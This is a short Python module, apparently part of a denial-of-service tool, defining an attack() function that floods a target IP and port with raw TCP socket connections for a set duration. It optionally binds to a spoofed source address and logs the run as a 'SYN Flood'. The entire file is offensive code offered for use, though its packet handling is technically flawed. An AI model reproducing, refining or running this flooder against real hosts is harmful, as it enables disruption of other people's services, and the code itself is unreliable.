import socket
import time
from app.logger import log_attack

def attack(target_ip, target_port, duration, intensity, packet_size=None, headers=None, spoof_ip=None):
    start_time = time.time()
    while time.time() - start_time < duration:
        for _ in range(intensity):
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            if spoof_ip:
                sock.bind((spoof_ip, 0))  # Bind to the spoofed IP
            sock.connect_ex((target_ip, target_port))
            sock.close()

    log_attack("SYN Flood", target_ip, target_port, duration, intensity)

    